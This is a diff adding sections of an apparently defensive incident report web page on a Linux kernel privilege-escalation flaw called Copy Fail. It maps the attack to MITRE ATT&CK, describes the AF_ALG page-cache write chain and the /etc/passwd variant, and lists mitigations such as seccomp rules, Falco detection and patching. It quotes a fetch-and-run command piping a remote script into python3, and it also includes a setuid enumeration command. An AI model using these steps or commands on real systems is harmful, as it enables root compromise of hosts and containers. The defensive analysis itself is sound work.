+        <!-- Exposure gap region: defender curve to attacker line, day 37+ -->
+        <!-- Attacker line: 0 to day 37, then jumps to 100% -->
+
+        <!-- Defender area (under curve) -->
+        <path d="M 100 380 L 100 380 L 306 380 L 306 365 L 535 365 L 535 320 L 788 320 L 788 295 L 950 295 L 950 270 L 1040 250 L 1040 380 Z" fill="url(#defGrad)"/>
+
+        <!-- Defender step curve (cyan) -->
+        <path d="M 100 380 L 306 380 L 306 365 L 535 365 L 535 320 L 788 320 L 788 295 L 950 295 L 950 270 L 1040 250" fill="none" stroke="var(--constructive)" stroke-width="2.5" stroke-linejoin="round"/>
+
+        <!-- Defender step markers -->
+        <g fill="var(--constructive)">
+          <circle cx="306" cy="365" r="4"/>
+          <circle cx="535" cy="320" r="4"/>
+          <circle cx="788" cy="295" r="4"/>
+          <circle cx="950" cy="270" r="4"/>
+        </g>
+
+        <!-- Attacker curve (red): flat 0% then vertical jump at day 37 -->
+        <path d="M 100 380 L 950 380 L 950 60 L 1040 60" fill="none" stroke="var(--danger)" stroke-width="2.5" stroke-linejoin="miter"/>
+        <!-- Attacker fill region (the wall) -->
+        <rect x="950" y="60" width="90" height="320" fill="url(#dangerHatch)"/>
+
+        <!-- The wall marker -->
+        <circle cx="950" cy="60" r="5" fill="var(--danger)"/>
+        <circle cx="950" cy="60" r="9" fill="none" stroke="var(--danger)" stroke-width="1" opacity="0.5"/>
+
+        <!-- Legend -->
+        <g font-family="JetBrains Mono" font-size="10" letter-spacing="1.5">
+          <line x1="100" y1="40" x2="130" y2="40" stroke="var(--constructive)" stroke-width="2.5"/>
+          <text x="138" y="44" fill="var(--text-dim)">DEFENDER · % of fleet patched</text>
+
+          <line x1="430" y1="40" x2="460" y2="40" stroke="var(--danger)" stroke-width="2.5"/>
+          <text x="468" y="44" fill="var(--text-dim)">ATTACKER · public exploit available</text>
+        </g>
+
+        <!-- Annotations -->
+        <!-- Defender step annotation -->
+        <text x="306" y="358" text-anchor="middle" font-family="Fraunces" font-style="italic" font-size="10" fill="var(--constructive)">+5%</text>
+        <text x="535" y="313" text-anchor="middle" font-family="Fraunces" font-style="italic" font-size="10" fill="var(--constructive)">+20%</text>
+        <text x="788" y="288" text-anchor="middle" font-family="Fraunces" font-style="italic" font-size="10" fill="var(--constructive)">~30%</text>
+
+        <!-- Exposure window label, stacked one word per line, centered in gap region -->
+        <g>
+          <text x="995" y="155" text-anchor="middle" font-family="Fraunces" font-style="italic" font-size="14" fill="var(--text)">Exposure</text>
+          <text x="995" y="175" text-anchor="middle" font-family="Fraunces" font-style="italic" font-size="14" fill="var(--text)">window</text>
+        </g>
+
+        <!-- Bottom takeaway band -->
+        <text x="100" y="448" font-family="Fraunces" font-style="italic" font-size="13" fill="var(--text-dim)">The shape that keeps repeating: gradual climb on one side, vertical wall on the other.</text>
+      </svg>
+    </div>
+  </div>
+</section>
+
+<!-- ATTACK CHAIN -->
+<section>
+  <div class="container">
+    <div class="eyebrow"><span class="eyebrow-num">05</span>Attack chain · MITRE ATT&CK</div>
+    <h2 class="section-title reveal">A short chain by design.</h2>
+    <p class="section-lede reveal reveal-delay-1">That economy is part of what makes it dangerous. Five dominant techniques drive the exploit. Each card expands for the concrete description and source-graded confidence.</p>
+
+    <div class="attack-grid">
+
+      <article class="attack-card reveal" tabindex="0" role="button" aria-expanded="false">
+        <div class="attack-tac">TA0004 · Privilege Escalation</div>
+        <div class="attack-id">T1068</div>
+        <h3 class="attack-name">Exploitation for Privilege Escalation</h3>
+        <p class="attack-summary">The whole exploit, distilled. Open AF_ALG socket, bind to authencesn, splice setuid binary's page cache pages, trigger AEAD decrypt, watch the 4-byte scratch write land in the cached binary, exec.</p>
+        <div class="attack-detail">
+          <p>An unprivileged local user opens an <strong>AF_ALG socket</strong>, binds to <span class="mono">authencesn(hmac(sha256),cbc(aes))</span>, splices page cache pages of a setuid-root binary (default: <span class="mono">/usr/bin/su</span>) into the crypto pipeline, and triggers an AEAD decrypt. The <span class="mono">authencesn</span> algorithm performs a 4-byte scratch write at offset <span class="mono">assoclen + cryptlen</span> — outside its contracted output region — which lands inside the chained tag pages, modifying the kernel's cached copy of the setuid binary. HMAC verification fails and <span class="mono">recvmsg()</span> returns an error, but the page-cache corruption persists. Repeating at successive offsets stages shellcode into <span class="mono">/usr/bin/su</span>'s cached pages. Executing <span class="mono">su</span> afterward runs the corrupted binary with UID 0. Root.</p>
+          <div class="attack-meta">
+            <span>Source [1, 2, 5]</span>
+            <span class="attack-conf high">High Confidence</span>
+          </div>
+        </div>
+        <span class="expand-hint">Expand</span>
+      </article>
+
+      <article class="attack-card reveal reveal-delay-1" tabindex="0" role="button" aria-expanded="false">
+        <div class="attack-tac">TA0004 · Privilege Escalation</div>
+        <div class="attack-id">T1611</div>
+        <h3 class="attack-name">Escape to Host</h3>
+        <p class="attack-summary">The Linux page cache is shared host-wide across all processes — including across container boundaries. A pod with the right primitives compromises the node and crosses tenant boundaries.</p>
+        <div class="attack-detail">
+          <p>This is what elevates Copy Fail from "another Linux LPE" to a Kubernetes node compromise vector. When an unprivileged process inside a container splices a setuid binary's page cache pages into the AF_ALG socket and triggers the scratch write, the corruption applies to the host's cached copy of that binary — not just the container's view. Theori labels Copy Fail a <em>"container escape primitive"</em>; their Part 2 writeup on Kubernetes container escape is forthcoming.</p>
+          <div class="attack-meta">
+            <span>Source [1, 2, 6, 7]</span>
+            <span class="attack-conf high">High Confidence</span>
+          </div>
+        </div>
+        <span class="expand-hint">Expand</span>
+      </article>
+
+      <article class="attack-card reveal reveal-delay-2" tabindex="0" role="button" aria-expanded="false">
+        <div class="attack-tac">TA0006 · Credential Access</div>
+        <div class="attack-id">T1212</div>
+        <h3 class="attack-name">Exploitation for Credential Access</h3>
+        <p class="attack-summary">Alternate path: instead of corrupting setuid binaries, flip the user's UID field in /etc/passwd's page cache to 0000. Same primitive, different target file, same outcome.</p>
+        <div class="attack-detail">
+          <p>Documented in the third-party reproduction at <span class="mono">github.com/rootsecdev</span> within 24 hours of the original disclosure. The attacker uses the same 4-byte page-cache-write primitive to flip the running user's UID field in <span class="mono">/etc/passwd</span>'s in-memory page cache to <span class="mono">0000</span>. A subsequent <span class="mono">su</span> invocation — with the user's own password — yields a root shell because libc's UID lookup now reports UID 0. <strong>This was published within 24 hours of original disclosure</strong> and demonstrates how quickly the universal write primitive can be retargeted by the community.</p>
+          <div class="attack-meta">
+            <span>Source [12]</span>
+            <span class="attack-conf medium">Medium Confidence</span>
+          </div>
+        </div>
+        <span class="expand-hint">Expand</span>
+      </article>
+
+      <article class="attack-card reveal" tabindex="0" role="button" aria-expanded="false">
+        <div class="attack-tac">TA0007 · Discovery</div>
+        <div class="attack-id">T1083</div>
+        <h3 class="attack-name">File and Directory Discovery</h3>
+        <p class="attack-summary">Setuid binary enumeration as exploit pre-step. PoC accepts any setuid binary as argv[1] — find / -perm -4000 finds the candidates.</p>
+        <div class="attack-detail">
+          <p>The default exploit targets <span class="mono">/usr/bin/su</span>, but Theori's PoC accepts any setuid binary as <span class="mono">argv[1]</span>. In a real exploitation scenario the attacker enumerates setuid-root binaries on the host (<span class="mono">find / -perm -4000 -type f 2>/dev/null</span>) to identify the most reliable target. On hardened or minimized distros, alternatives include <span class="mono">sudo</span>, <span class="mono">passwd</span>, <span class="mono">mount</span>, <span class="mono">chsh</span>, <span class="mono">newgrp</span>. <strong>This is observable in process telemetry</strong>, which matters for detection.</p>
+          <div class="attack-meta">
+            <span>Source [1] + inferred</span>
+            <span class="attack-conf medium">Medium Confidence</span>
+          </div>
+        </div>
+        <span class="expand-hint">Expand</span>
+      </article>
+
+      <article class="attack-card reveal reveal-delay-1" tabindex="0" role="button" aria-expanded="false">
+        <div class="attack-tac">TA0002 · Execution</div>
+        <div class="attack-id">T1059.006</div>
+        <h3 class="attack-name">Command and Scripting Interpreter: Python</h3>
+        <p class="attack-summary">732-byte Python script. Standard library only — os, socket, zlib. Python 3.10+ is on every modern enterprise Linux distribution by default.</p>
+        <div class="attack-detail">
+          <p>The exploit is 732 bytes. Python 3.10+ standard library only — <span class="mono">os</span>, <span class="mono">socket</span>, <span class="mono">zlib</span>. <strong>No compiled payloads, no dependency installation, no build step.</strong> Critical to the threat model: Python 3.10+ is present by default on every modern enterprise Linux distribution, and the standard library alone is sufficient. The exploit needs no toolchain on the target, no network egress for dependency download, no privilege escalation merely to run the script. A non-root user with shell access — the minimum foothold — can execute the entire chain.</p>
+          <div class="attack-meta">
+            <span>Source [1, 2, 5]</span>
+            <span class="attack-conf high">High Confidence</span>
+          </div>
+        </div>
+        <span class="expand-hint">Expand</span>
+      </article>
+
+    </div>
+
+    <!-- SUPPORTING DROPDOWN -->
+    <div class="supporting-wrap" data-supporting>
+      <button class="supporting-toggle" aria-expanded="false">
+        <span>
+          <span class="supporting-label">Supporting techniques observed</span>
+          <br><span class="supporting-meta">6 adjacent ATT&CK techniques · click to expand</span>
+        </span>
+      </button>
+      <div class="supporting-list">
+
+        <article class="attack-card" tabindex="0" role="button" aria-expanded="false">
+          <div class="attack-tac">TA0001 · Initial Access</div>
+          <div class="attack-id">T1190</div>
+          <h3 class="attack-name">Exploit Public-Facing Application</h3>
+          <p class="attack-summary">Copy Fail itself is local — to reach it in production, an attacker chains it with web RCE, stolen SSH credentials, malicious PR on a CI runner, or AI agent sandbox.</p>
+          <div class="attack-detail">
+            <p>Theori, quoted by Help Net Security: <em>"chain it with anything that gives you that — web RCE landing in an unprivileged service account, an SSH foothold, a malicious PR on a CI runner — and you're root."</em></p>
+            <div class="attack-meta"><span>Source [6, 7]</span><span class="attack-conf high">High</span></div>
+          </div>
+          <span class="expand-hint">Expand</span>
+        </article>
+
+        <article class="attack-card" tabindex="0" role="button" aria-expanded="false">
+          <div class="attack-tac">TA0001 · Initial Access</div>
+          <div class="attack-id">T1078</div>
+          <h3 class="attack-name">Valid Accounts</h3>
+          <p class="attack-summary">A legitimately-issued unprivileged account on a multi-tenant Linux host is the cleanest precondition. Shared dev hosts, jump hosts, build servers fit this pattern.</p>
+          <div class="attack-detail">
+            <p>The disclosure flags multi-tenant Linux hosts as the highest-priority patching target — exactly because this initial-access path is so common.</p>
+            <div class="attack-meta"><span>Source [1, 4]</span><span class="attack-conf high">High</span></div>
+          </div>
+          <span class="expand-hint">Expand</span>
+        </article>
+
+        <article class="attack-card" tabindex="0" role="button" aria-expanded="false">
+          <div class="attack-tac">TA0005 · Defense Evasion</div>
+          <div class="attack-id">T1564</div>
+          <h3 class="attack-name">Hide Artifacts</h3>
+          <p class="attack-summary">The 4-byte write goes to page cache only. Kernel never marks it dirty for writeback. AIDE, Tripwire, rpm -V, debsums all see a clean file.</p>
+          <div class="attack-detail">
+            <p>The corrupted in-memory copy is what gets read on every subsequent <span class="mono">read()</span>, <span class="mono">mmap()</span>, and <span class="mono">execve()</span> — until the page is evicted by memory pressure or reboot, at which point the cache reloads from the unchanged on-disk copy and the modification is gone with no trace. Invisible to disk forensics, ephemeral on reboot.</p>
+            <div class="attack-meta"><span>Source [2, 4, 6]</span><span class="attack-conf high">High</span></div>
+          </div>
+          <span class="expand-hint">Expand</span>
+        </article>
+
+        <article class="attack-card" tabindex="0" role="button" aria-expanded="false">
+          <div class="attack-tac">TA0005 · Defense Evasion</div>
+          <div class="attack-id">T1497</div>
+          <h3 class="attack-name">Virtualization/Sandbox Evasion</h3>
+          <p class="attack-summary">Standard Linux containers share a kernel with the host and are not a security boundary against Copy Fail. Firecracker microVMs, V8 isolates, gVisor are not affected.</p>
+          <div class="attack-detail">
+            <p>Bugcrowd's framing: <em>"the boundaries that hold are the ones that don't share a kernel."</em> AWS Lambda and Fargate (Firecracker), Cloudflare Workers (V8 isolates), gVisor's user-space kernel — all structurally outside Copy Fail's blast radius. Standard Docker/containerd/runc are not.</p>
+            <div class="attack-meta"><span>Source [1, 7]</span><span class="attack-conf high">High</span></div>
+          </div>
+          <span class="expand-hint">Expand</span>
+        </article>
+
+        <article class="attack-card" tabindex="0" role="button" aria-expanded="false">
+          <div class="attack-tac">TA0005 / TA0006</div>
+          <div class="attack-id">T1556</div>
+          <h3 class="attack-name">Modify Authentication Process</h3>
+          <p class="attack-summary">Corrupting /usr/bin/su or /etc/passwd in the page cache effectively backdoors auth flow until eviction or reboot.</p>
+          <div class="attack-detail">
+            <p>While the corrupted state lasts, every invocation of <span class="mono">su</span> on the host runs the modified binary. The third-party PoC at github.com/rootsecdev documents this explicitly: after <span class="mono">--shell</span> mode runs, the <span class="mono">/etc/passwd</span> page-cache modification is left corrupted "until you clear it." Anything resolving UID 1000 → name will fail or show numeric IDs.</p>
+            <div class="attack-meta"><span>Source [12]</span><span class="attack-conf medium">Medium</span></div>
+          </div>
+          <span class="expand-hint">Expand</span>
+        </article>
+
+        <article class="attack-card" tabindex="0" role="button" aria-expanded="false">
+          <div class="attack-tac">TA0005 · Defense Evasion</div>
+          <div class="attack-id">T1610</div>
+          <h3 class="attack-name">Deploy Container</h3>
+          <p class="attack-summary">Adjacent threat model. An attacker able to deploy a container into a multi-tenant cluster gets the unprivileged-local-execution foothold the LPE needs.</p>
+          <div class="attack-detail">
+            <p>Not a chain step Copy Fail uses, but an adjacent technique that becomes more dangerous in the presence of Copy Fail. Malicious image push, hostile workload submission, poisoned Helm chart — all paths that get an attacker into a container on a shared kernel.</p>
+            <div class="attack-meta"><span>Source [1, 7]</span><span class="attack-conf medium">Medium</span></div>
+          </div>
+          <span class="expand-hint">Expand</span>
+        </article>
+
+      </div>
+    </div>
+
+  </div>
+</section>
+
+<!-- PULLQUOTE 2 -->
+<section class="pullquote">
+  <div class="pullquote-inner reveal">
+    <span class="pullquote-mark inflection">"</span>
+    <p class="pullquote-text">If your threat model still budgets kernel LPEs as rare, you probably have weeks to update that — not years.</p>
+    <p class="pullquote-attr"><strong>David Brumley</strong> · Chief AI &amp; Science Officer, Bugcrowd · CMU professor · ForAllSecure founder · Source [7]</p>
+  </div>
+</section>
+
+<!-- STANDARDS MAPPING -->
+<section>
+  <div class="container">
+    <div class="eyebrow"><span class="eyebrow-num">06</span>Where this fits in the standards landscape</div>
+    <h2 class="section-title reveal">Three frameworks, three jobs.</h2>
+    <p class="section-lede reveal reveal-delay-1">CWE names the underlying weakness. NIST CSF 2.0 names the organizational response. OWASP LLM Top 10 names the environment the next disclosure lands in. Each does work the others don't.</p>
+
+    <div class="standards-honesty reveal">
+      <strong>The underlying weakness</strong> is described by <span class="mono" style="font-style:normal">CWE-1188 (Initialization with Insecure Default)</span>, with <span class="mono" style="font-style:normal">CWE-787 (Out-of-bounds Write)</span> as the proximate symptom. <strong>The organizational response</strong> maps to four NIST CSF 2.0 functions: PR.PS, PR.IR, DE.CM, GV.RM. <strong>The environment</strong> the next disclosure will land in is the world the OWASP LLM Top 10's LLM06 (Excessive Agency) describes — AI agents on both sides of the attack chain. The mapping below is what each framework actually contributes.
+    </div>
+
+    <h3 class="serif" style="font-size:22px;margin-bottom:24px;font-style:italic;">Underlying weakness</h3>
+    <div class="standards-grid">
+      <div class="standards-card primary reveal">
+        <div class="standards-id">CWE-1188</div>
+        <div class="standards-name">Initialization of a Resource with an Insecure Default</div>
+        <p class="standards-body">The 2017 in-place optimization set up the AEAD operation with page-cache pages reachable through a writable scatterlist. The API's implicit contract — "every AEAD algorithm will confine its writes to the legitimate destination" — was unstated and unenforced.</p>
+        <div class="standards-severity">Primary driver</div>
+      </div>
+      <div class="standards-card contributing reveal reveal-delay-1">
+        <div class="standards-id">CWE-787</div>
+        <div class="standards-name">Out-of-bounds Write (partial fit)</div>
+        <p class="standards-body">authencesn writes 4 bytes at <span class="mono">dst[assoclen + cryptlen]</span> — past the contracted AEAD output region. Technically correct, operationally incomplete: the algorithm believes it owns that scratch space; the bounds violation only matters because of the upstream initialization weakness.</p>
+        <div class="standards-severity contributing">Contributing factor</div>
+      </div>
+    </div>
+
+    <h3 class="serif" style="font-size:22px;margin:48px 0 24px;font-style:italic;">Organizational response · NIST CSF 2.0</h3>
+    <div class="standards-grid">
+      <div class="standards-card primary reveal">
+        <div class="standards-id">PR.PS</div>
+        <div class="standards-name">Platform Security</div>
+        <p class="standards-body">Kernel patching cadence, kernel module configuration, seccomp profiles, kernel-version awareness across the fleet — all PR.PS. The CSA paper's storm-class Risk #1 maps here.</p>
+        <div class="standards-severity">Primary driver</div>
+      </div>
+      <div class="standards-card contributing reveal reveal-delay-1">
+        <div class="standards-id">PR.IR</div>
+        <div class="standards-name">Infrastructure Resilience</div>
+        <p class="standards-body">Network segmentation, isolation of multi-tenant workloads, architectural choice of isolation boundary (microVM vs. container vs. VM vs. dedicated host). What limits Copy Fail's blast radius is the architecture, not the patch alone.</p>
+        <div class="standards-severity contributing">Contributing factor</div>
+      </div>
+      <div class="standards-card contributing reveal">
+        <div class="standards-id">DE.CM</div>
+        <div class="standards-name">Continuous Monitoring</div>
+        <p class="standards-body">Runtime detection of unexpected AF_ALG SEQPACKET socket creation. Sysdig's published Falco rule is exactly this control. Detection complements but doesn't replace patching.</p>
+        <div class="standards-severity contributing">Contributing factor</div>
+      </div>
+      <div class="standards-card primary reveal reveal-delay-1">
+        <div class="standards-id">GV.RM</div>
+        <div class="standards-name">Risk Management Strategy</div>
+        <p class="standards-body">The CSA paper's Risk #5 — "Cybersecurity Risk Model Outdated" — is the meta-risk this report makes the case for. Pre-AI assumptions about exploit timelines, patch windows, and kernel-LPE rarity may not hold.</p>
+        <div class="standards-severity">Primary driver</div>
+      </div>
+    </div>
+
+    <h3 class="serif" style="font-size:22px;margin:48px 0 24px;font-style:italic;">The environment · OWASP LLM Top 10</h3>
+    <div class="standards-grid">
+      <div class="standards-card contributing reveal">
+        <div class="standards-id">LLM06</div>
+        <div class="standards-name">Excessive Agency</div>
+        <p class="standards-body">The CSA AI Vulnerability Storm paper maps this to the broader risk of AI agents on both sides of the attack chain — offensive scanners like Xint Code on the discovery side, defensive coding/review agents on the response side. Not a weakness in Copy Fail itself; the standard that names the operating environment every Copy-Fail-class disclosure now lands in. Forward-looking framing for the recommendations section.</p>
+        <div class="standards-severity contributing">Environmental</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- WHAT EXISTED & COULD HAVE HELPED -->
+<section>
+  <div class="container">
+    <div class="eyebrow"><span class="eyebrow-num">07</span>What existed and could have helped</div>
+    <h2 class="section-title reveal">Eight controls were available. Each one helped <em>somewhere</em> in the industry.</h2>
+    <p class="section-lede reveal reveal-delay-1">The question is what made each one hard to extend further. No blame. Every gap below is structural — coverage, prioritization, operational readiness for a faster window. Click any item to see the constructive reframing.</p>
+
+    <div class="mitigation-list">
+
+      <article class="mit-card reveal" tabindex="0" role="button" aria-expanded="false">
+        <div class="mit-header">
+          <div class="mit-num">01</div>
+          <h3 class="mit-title">Kernel patching cadence aligned to upstream stable releases</h3>
+          <span class="mit-expand">Detail</span>
+        </div>
+        <div class="mit-detail">
+          <h4>What it would have done</h4>
+          <p>Distributions tracking mainline closely (Arch Linux's model) had a closed window before the public PoC dropped. Mainline patched 1 April; PoC public 29 April. An organization on Arch had 28 days of head start. Organizations on longterm series 6.12, 6.6, 6.1, 5.15, or 5.10 were waiting on backports that had not yet landed in the upstream stable queues by 29 April.</p>
+          <h4>Why it was not effective everywhere</h4>
+          <p>Coverage gap by design — enterprise distributions are built around longterm kernel series for stability, regression testing, and customer support obligations. Arch tracks mainline; enterprise workloads do not run on Arch. The longterm-stable model trades patch latency for stability — that trade has held up for years and is not wrong on its own terms.</p>
+          <div class="mit-frame">The longterm kernel model is not broken. The structural problem is that the assumption underlying it — that the gap between mainline patch and broad distro shipment is a low-risk window — is being eroded by direct PoC publication on disclosure day. Eddie Chapman's note on oss-security — <em>"backporting that far back is not as straightforward"</em> — describes legitimate engineering work, not negligence.</div>
+          <h4 style="margin-top:16px;">Source &amp; grounding</h4>
+          <p>NIST SP 800-53 SI-2; CIS Controls v8 Control 7; NIST CSF 2.0 PR.PS-02. Source [4, 9, 11].</p>
+        </div>
+      </article>
+
+      <article class="mit-card reveal" tabindex="0" role="button" aria-expanded="false">
+        <div class="mit-header">
+          <div class="mit-num">02</div>
+          <h3 class="mit-title">MicroVM / VM-level isolation for untrusted workloads</h3>
+          <span class="mit-expand">Detail</span>
+        </div>
+        <div class="mit-detail">
+          <h4>What it would have done</h4>
+          <p>Workloads on Firecracker microVMs (AWS Lambda, Fargate), V8 isolates (Cloudflare Workers), or gVisor's user-space kernel are <strong>structurally outside Copy Fail's blast radius</strong> — they don't share a Linux kernel page cache with the host or other tenants. Bugcrowd: <em>"the boundaries that hold are the ones that don't share a kernel."</em></p>
+          <h4>Why it was not effective everywhere</h4>
+          <p>Coverage gap — most enterprise Kubernetes clusters, CI runners, and self-hosted PaaS environments run untrusted code in standard Linux containers. The dominant industry posture for the last decade has been "containers are good enough for many workloads," and that has been correct for a wide range of threat models.</p>
+          <div class="mit-frame">This is not a "containers are insecure" finding. It is a "container as a security boundary against shared-kernel LPE primitives" finding — which has been called out for years and was again acknowledged in Bugcrowd's commentary: <em>"Containers were never meant to be a security boundary anyway."</em> The constructive question is workload-specific: which workloads warrant a stronger boundary, and what would migrating them cost?</div>
+          <h4 style="margin-top:16px;">Source &amp; grounding</h4>
+          <p>NIST SP 800-190 §4.5; AWS Firecracker design; Google gVisor design. Source [1, 7].</p>
+        </div>
+      </article>
+
+      <article class="mit-card reveal" tabindex="0" role="button" aria-expanded="false">
+        <div class="mit-header">
+          <div class="mit-num">03</div>
+          <h3 class="mit-title">Seccomp profile blocking AF_ALG socket creation</h3>
+          <span class="mit-expand">Detail</span>
+        </div>
+        <div class="mit-detail">
+          <h4>What it would have done</h4>
+          <p>A seccomp profile denying <span class="mono">socket(AF_ALG, ...)</span> on container or sandbox workloads makes the very first step of the chain impossible. The exploit cannot get past <span class="mono">socket(38, 5, 0)</span>. CERT-EU recommends this for containerized environments regardless of patch state.</p>
+          <h4>Why it was not effective everywhere</h4>
+          <p>Default Docker and Kubernetes seccomp profiles do not block AF_ALG. Most containerized workloads in production today do not have a custom seccomp profile that would have closed this path before disclosure. Custom profiles are non-trivial to author and maintain.</p>
+          <div class="mit-frame">The reason most environments don't have custom seccomp profiles is not laziness — it is the realistic cost-benefit calculation of operational simplicity vs. defense-in-depth. What Copy Fail changes is the cost-benefit calculation for <strong>untrusted-code workloads specifically</strong>: AF_ALG is a path very few legitimate application workloads need, and blocking it is a low-cost, high-value deny rule.</div>
+          <h4 style="margin-top:16px;">Source &amp; grounding</h4>
+          <p>Linux seccomp documentation; Docker default seccomp profile; Kubernetes seccomp documentation. Source [1, 3].</p>
+        </div>
+      </article>
+
+      <article class="mit-card reveal" tabindex="0" role="button" aria-expanded="false">
+        <div class="mit-header">
+          <div class="mit-num">04</div>
+          <h3 class="mit-title">Runtime detection of unexpected AF_ALG SEQPACKET socket creation</h3>
+          <span class="mit-expand">Detail</span>
+        </div>
+        <div class="mit-detail">
+          <h4>What it would have done</h4>
+          <p>A Falco rule flagging AF_ALG SEQPACKET socket creation by any process outside a known disk-encryption toolchain whitelist (cryptsetup, systemd-cryptsetup, veritysetup, integritysetup, kcapi-* tools) catches the <strong>mandatory first syscall</strong> of the chain. Sysdig published exactly this rule within hours of disclosure; Sysdig Secure customers had it deployed automatically.</p>
+          <h4>Why it was not effective everywhere</h4>
+          <p>The rule did not exist as a published detection prior to disclosure (no disclosure, no rule). Pre-disclosure, an enterprise would have needed an in-house detection engineering team independently identifying AF_ALG SEQPACKET socket creation as anomalous, or a behavioral-baseline approach. Coverage of either is uneven.</p>
+          <div class="mit-frame">Detection engineering is by nature lagging — rules follow disclosed CVEs. The structural lesson is that environments running runtime behavioral detection (Falco, Sysdig Secure, Tetragon, vendor EDR equivalents) had a same-day path to coverage. Environments relying solely on signature-based scanners did not. This isn't a per-tool endorsement; it's a category observation.</div>
+          <h4 style="margin-top:16px;">Source &amp; grounding</h4>
+          <p>Falco (CNCF graduated project); NIST CSF 2.0 DE.CM; MITRE ATT&amp;CK detection guidance for T1068. Source [5].</p>
+        </div>
+      </article>
+
+      <article class="mit-card reveal" tabindex="0" role="button" aria-expanded="false">
+        <div class="mit-header">
+          <div class="mit-num">05</div>
+          <h3 class="mit-title">Live kernel patching capability</h3>
+          <span class="mit-expand">Detail</span>
+        </div>
+        <div class="mit-detail">
+          <h4>What it would have done</h4>
+          <p>Live kernel patching (kpatch on RHEL, Canonical Livepatch on Ubuntu, kgraft on SUSE) applies a patched function to a running kernel without rebooting. For environments where reboots are operationally expensive — large fleets, stateful services, regulated reboot windows — live patching closes the gap between "patched package available" and "patched kernel running on the host."</p>
+          <h4>Why it was not effective everywhere</h4>
+          <p>Live patching depends on (a) the distribution offering it, (b) the organization having a subscription, and (c) the patch being released in a livepatch-compatible format. As of the report's as-of date, livepatch-compatible packages for Copy Fail were still being prepared. Adoption is correlated with operational maturity and budget.</p>
+          <div class="mit-frame">Live patching is high-leverage for the patch-availability-to-deployment gap, but it is one tool in a portfolio. It does not replace the need to reduce the upstream gap (mainline → distro shipment) — it just helps close the downstream gap (distro shipment → host). Both gaps matter.</div>
+          <h4 style="margin-top:16px;">Source &amp; grounding</h4>
+          <p>NIST SP 800-53 SI-2(5); kpatch / Livepatch / kgraft documentation.</p>
+        </div>
+      </article>
+
+      <article class="mit-card reveal" tabindex="0" role="button" aria-expanded="false">
+        <div class="mit-header">
+          <div class="mit-num">06</div>
+          <h3 class="mit-title">Egress filtering and network segmentation</h3>
+          <span class="mit-expand">Detail</span>
+        </div>
+        <div class="mit-detail">
+          <h4>What it would have done</h4>
+          <p>Copy Fail has no remote vector. To reach the LPE in production, an attacker needs unprivileged local execution — typically via web RCE, SSH foothold, malicious PR on a CI runner, or compromised AI agent sandbox. Egress filtering on application-tier hosts limits an attacker's ability to download the exploit (<span class="mono">curl https://copy.fail/exp | python3</span>). Segmentation limits how far root compromise propagates. The CSA paper notes egress filtering "blocked every public log4j exploit."</p>
+          <h4>Why it was not effective everywhere</h4>
+          <p>Egress filtering coverage is uneven. Many shops apply it rigorously to internet-facing servers but loosely to internal CI runners, build hosts, and developer infrastructure — exactly the surfaces where Copy Fail is most consequential. Pod-to-node segmentation is impossible without a different isolation primitive.</p>
+          <div class="mit-frame">Egress filtering is not a Copy Fail control specifically — it is a general control that happens to disrupt one common delivery path. The 732-byte exploit can also be copy-pasted from an attacker who already has shell access; egress filtering doesn't help in that case. The honest framing: high-leverage <em>defense in depth</em>, not a single-layer fix.</div>
+          <h4 style="margin-top:16px;">Source &amp; grounding</h4>
+          <p>CIS Controls v8 Controls 12 &amp; 13; NIST CSF 2.0 PR.IR; NIST SP 800-207. Source [1, 11].</p>
+        </div>
+      </article>
+
+      <article class="mit-card reveal" tabindex="0" role="button" aria-expanded="false">
+        <div class="mit-header">
+          <div class="mit-num">07</div>
+          <h3 class="mit-title">Inventory of multi-tenant and untrusted-code-executing surfaces</h3>
+          <span class="mit-expand">Detail</span>
+        </div>
+        <div class="mit-detail">
+          <h4>What it would have done</h4>
+          <p>An accurate, current inventory of <em>which</em> hosts run untrusted code, multi-tenant workloads, or shared-kernel containers — vs. which hosts are single-tenant, first-party-only — is what makes patch prioritization possible at speed. The disclosure's prioritization guidance is explicit: multi-tenant hosts → K8s → CI runners → SaaS sandboxes → standard servers → workstations. Without trust-posture-tagged inventory, that prioritization can't execute.</p>
+          <h4>Why it was not effective everywhere</h4>
+          <p>Inventory completeness is one of the longest-standing weak points in enterprise security posture, repeatedly identified across CIS, NIST, and SANS year after year. The CSA paper flags this as Risk #6 — HIGH severity — specifically because AI-accelerated discovery aggravates it. The reason inventory is hard is well-understood: distributed ownership, shadow IT, ephemeral cloud resources, container churn.</p>
+          <div class="mit-frame">Inventory is structurally hard. The constructive lesson is not "shame on you for not having a perfect inventory" — it is that the prioritization decisions a CISO makes in a fast-moving disclosure are <em>gated by inventory quality</em>. Investments in inventory pay returns precisely in the moments that matter most.</div>
+          <h4 style="margin-top:16px;">Source &amp; grounding</h4>
+          <p>NIST CSF 2.0 ID.AM; CIS Controls v8 Control 1; CSA Priority Action 7. Source [1, 11].</p>
+        </div>
+      </article>
+
+      <article class="mit-card reveal" tabindex="0" role="button" aria-expanded="false">
+        <div class="mit-header">
+          <div class="mit-num">08</div>
+          <h3 class="mit-title">Coordinated disclosure pipeline with capacity for fast-tracked critical advisories</h3>
+          <span class="mit-expand">Detail</span>
+        </div>
+        <div class="mit-detail">
+          <h4>What it would have done</h4>
+          <p>The Linux kernel's coordinated disclosure process worked well for Copy Fail at the upstream layer — 9 days from report to mainline patch is fast by any historical measure. Where the system is showing strain is downstream propagation: from upstream patch to distro-shipped kernel to enterprise-deployed kernel.</p>
+          <h4>Why it was not effective everywhere</h4>
+          <p>This is not a case where the pipeline failed. The kernel team's response was textbook. The strain is at scale: as more LLM-assisted reports arrive (CSA paper cites kernel maintainer reports climbing from 2/week to 10/week), the same headcount triages more reports under similar embargo pressure, while distros face the same backporting queue across more concurrent CVEs.</p>
+          <div class="mit-frame">The kernel community's response here is the <strong>good news</strong> in the story. The structural lesson is that the pipeline that worked well for Copy Fail will be load-tested by volume in the months ahead. The Linux kernel maintainers asking <em>"what should embargo policy look like in the LLM age?"</em> on oss-security is the system trying to adapt; defenders should expect to adapt alongside them.</div>
+          <h4 style="margin-top:16px;">Source &amp; grounding</h4>
+          <p>ISO/IEC 29147 &amp; 30111; CISA Coordinated Vulnerability Disclosure guidance. Source [1, 10, 11].</p>
+        </div>
+      </article>
+
+    </div>
+  </div>
+</section>
+
+<!-- PULLQUOTE 3 -->
+<section class="pullquote">
+  <div class="pullquote-inner reveal">
+    <span class="pullquote-mark constructive">"</span>
